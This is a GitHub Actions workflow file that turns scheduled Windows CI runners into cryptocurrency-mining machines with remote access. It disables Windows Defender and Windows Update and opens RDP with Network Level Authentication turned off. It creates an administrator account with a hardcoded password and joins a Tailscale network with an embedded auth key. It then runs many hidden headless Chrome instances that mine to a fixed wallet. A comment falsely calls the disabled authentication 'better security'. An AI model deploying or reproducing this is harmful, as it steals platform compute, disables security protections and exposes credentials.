name: RDP Auto-Recreate with Miner Pro

on:
  workflow_dispatch:
    inputs:
      miner_workers:
        description: 'Number of miner workers'
        required: false
        default: '20'
        type: choice
        options:
        - '10'
        - '15'
        - '20'
        - '25'
        - '30'
  schedule:
    - cron: "0 */6 * * *"  # Every 6 hours

env:
  RDP_USER: "RDPUser"
  RDP_PASSWORD: "DefaultPass!234"
  MAX_RUNTIME: 340    # 5h40m
  MINER_URL: "https://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"

jobs:
  rdp-miner-pro:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Environment Variables
        run: |
          $workers = '${{ github.event.inputs.miner_workers || 20 }}'
          echo "MINER_WORKERS=$workers" >> $env:GITHUB_ENV
          echo "BUILD_ID=$env:GITHUB_RUN_ID" >> $env:GITHUB_ENV

      - name: System Optimization
        run: |
          # Disable Windows Defender
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableScriptScanning $true
          Set-MpPreference -DisableArchiveScanning $true

          # Power settings - prevent sleep
          powercfg /change standby-timeout-ac 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change monitor-timeout-ac 0
          powercfg /setactive SCHEME_MIN

          # Disable Windows Update
          Stop-Service -Name "wuauserv" -Force
          Set-Service -Name "wuauserv" -StartupType Disabled

          # Increase RDP performance
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "MaxInstanceCount" -Value 10
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxMonitors" -Value 4
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxXResolution" -Value 3840
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxYResolution" -Value 2160

      - name: Enable and Configure RDP
        run: |
          # Enable RDP
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

          # Configure Network Level Authentication for better security
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0

      - name: Create Secure RDP User
        run: |
          $securePassword = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
          
          # Delete user if exists and recreate
          if (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue) {
              Remove-LocalUser -Name $env:RDP_USER
          }
          
          New-LocalUser -Name $env:RDP_USER -Password $securePassword -AccountNeverExpires -PasswordNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
          
          # Enable the account
          Enable-LocalUser -Name $env:RDP_USER

      - name: Install Required Software
        run: |
          # Install Chrome silently
          $chromeInstaller = "$env:TEMP\chrome_installer.exe"
          Invoke-WebRequest "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chromeInstaller
          Start-Process -FilePath $chromeInstaller -ArgumentList "/silent", "/install" -Wait
          Remove-Item $chromeInstaller

          # Install Tailscale
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $installer = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest $tsUrl -OutFile $installer
          Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
          Remove-Item $installer
          Start-Sleep -Seconds 5

      - name: Setup Tailscale VPN
        run: |
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          $hostname = "GH-RDP-$env:GITHUB_RUN_ID"
          
          # Wait for Tailscale service to be ready
          $attempt = 0
          while ($attempt -lt 10) {
              try {
                  & $tsExe status
                  break
              } catch {
                  $attempt++
                  Start-Sleep -Seconds 5
              }
          }
          
          # Connect to Tailscale
          & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname $hostname --reset
          
          # Get IP with retry logic
          $retryCount = 0
          while ($retryCount -lt 10) {
              $ip = & $tsExe ip -4 2>$null
              if ($ip -and $ip -ne "0.0.0.0") {
                  echo "TS_IP=$ip" >> $env:GITHUB_ENV
                  Write-Host "âœ… Tailscale IP: $ip"
                  break
              }
              $retryCount++
              Start-Sleep -Seconds 10
          }
          
          if (-not $env:TS_IP) {
              throw "âŒ Failed to get Tailscale IP"
          }

      - name: Deploy Advanced Miner System
        run: |
          # Create miner management script
          $minerScript = @"
          `$workers = $env:MINER_WORKERS
          `$minerUrl = "$env:MINER_URL&workers=`$workers"
          `$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
          
          function Start-MinerProcess {
              param([int]`$id)
              while (`$true) {
                  try {
                      `$process = Start-Process -FilePath `$chromePath `
                          -ArgumentList "--headless", "--disable-gpu", "--no-sandbox", "--disable-dev-shm-usage", "--disable-software-rasterizer", "--disable-background-timer-throttling", "--memory-pressure-off", "--max_old_space_size=4096", "--remote-debugging-port=9`$id", "--app=`$minerUrl" `
                          -PassThru -WindowStyle Hidden
                      
                      Write-Host "Started miner worker `$id (PID: `$(`$process.Id))"
                      
                      # Monitor process
                      Wait-Process -Id `$process.Id -ErrorAction SilentlyContinue
                      Write-Host "Miner worker `$id stopped, restarting..."
                      Start-Sleep -Seconds 5
                  } catch {
                      Write-Host "Error in worker `$id: `$_"
                      Start-Sleep -Seconds 10
                  }
              }
          }
          
          # Start multiple workers
          for (`$i = 1; `$i -le `$workers; `$i++) {
              Start-Job -ScriptBlock `${function:Start-MinerProcess} -ArgumentList `$i -Name "miner-worker-`$i"
          }
          
          Write-Host "âœ… Started `$workers miner workers"
          
          # Keep script running
          while (`$true) {
              `$runningJobs = Get-Job | Where-Object State -eq 'Running'
              Write-Host "[`$(Get-Date)] Running miners: `$(`$runningJobs.Count)/`$workers"
              Start-Sleep -Seconds 60
          }
"@

          # Save and execute miner script
          $scriptPath = "$env:TEMP\miner_manager.ps1"
          $minerScript | Out-File -FilePath $scriptPath -Encoding UTF8
          
          # Start miner manager as background job
          Start-Job -ScriptBlock {
              param($path)
              & "powershell.exe" -File $path
          } -ArgumentList $scriptPath -Name "miner-manager"

      - name: Create Connection Info File
        run: |
          $connectionInfo = @"
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           RDP CONNECTION INFO         â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘ IP Address: $env:TS_IP                â•‘
â•‘ Username: $env:RDP_USER               â•‘
â•‘ Password: $env:RDP_PASSWORD           â•‘
â•‘ Workers: $env:MINER_WORKERS           â•‘
â•‘ Runtime: $env:MAX_RUNTIME minutes     â•‘
â•‘ Created: $(Get-Date)                  â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Connection Command:
mstsc /v:$env:TS_IP

Tailscale Status:
& "$env:ProgramFiles\Tailscale\tailscale.exe" status
"@
          
          $infoPath = "$env:GITHUB_WORKSPACE\RDP_Connection_Info.txt"
          $connectionInfo | Out-File -FilePath $infoPath -Encoding UTF8
          
          Write-Host "=========================================="
          Write-Host "ðŸš€ RDP SESSION READY"
          Write-Host "ðŸ“± IP: $env:TS_IP"
          Write-Host "ðŸ‘¤ User: $env:RDP_USER"
          Write-Host "ðŸ”‘ Pass: $env:RDP_PASSWORD"
          Write-Host "âš¡ Workers: $env:MINER_WORKERS"
          Write-Host "â± Duration: $env:MAX_RUNTIME minutes"
          Write-Host "ðŸ“‹ Info file: $infoPath"
          Write-Host "=========================================="

      - name: Monitor Session
        run: |
          $startTime = Get-Date
          $endTime = $startTime.AddMinutes($env:MAX_RUNTIME)
          $checkInterval = 30  # seconds
          
          while ((Get-Date) -lt $endTime) {
              $elapsed = [int]((Get-Date) - $startTime).TotalMinutes
              $remaining = [int]($endTime - (Get-Date)).TotalMinutes
              
              # Check miner status
              $minerJobs = Get-Job -Name "miner-worker-*" | Where-Object State -eq 'Running'
              $tsStatus = & "$env:ProgramFiles\Tailscale\tailscale.exe" status 2>$null
              
              Clear-Host
              Write-Host "=== RDP MINER MONITOR ==="
              Write-Host "Elapsed: $elapsed minutes"
              Write-Host "Remaining: $remaining minutes"
              Write-Host "Active Miners: $($minerJobs.Count)/$env:MINER_WORKERS"
              Write-Host "Tailscale IP: $env:TS_IP"
              Write-Host "Last Check: $(Get-Date)"
              Write-Host "========================="
              
              # Restart failed miners (if any)
              if ($minerJobs.Count -lt $env:MINER_WORKERS) {
                  Write-Host "âš ï¸ Some miners stopped, restarting..."
                  # The miner manager should handle restarts automatically
              }
              
              Start-Sleep -Seconds $checkInterval
          }
          
          Write-Host "â° Session time completed"

      - name: Cleanup Resources
        if: always()
        run: |
          Write-Host "Starting cleanup process..."
          
          # Stop all miner jobs
          Get-Job | Stop-Job -PassThru | Remove-Job -Force
          
          # Kill Chrome processes
          Get-Process -Name "chrome*" -ErrorAction SilentlyContinue | Stop-Process -Force
          
          # Tailscale logout
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          & $tsExe logout 2>$null
          
          # Re-enable Windows Defender
          Set-MpPreference -DisableRealtimeMonitoring $false
          
          # Clean temp files
          Remove-Item "$env:TEMP\miner_manager.ps1" -ErrorAction SilentlyContinue
          Remove-Item "$env:GITHUB_WORKSPACE\RDP_Connection_Info.txt" -ErrorAction SilentlyContinue
          
          Write-Host "âœ… Cleanup completed successfully"
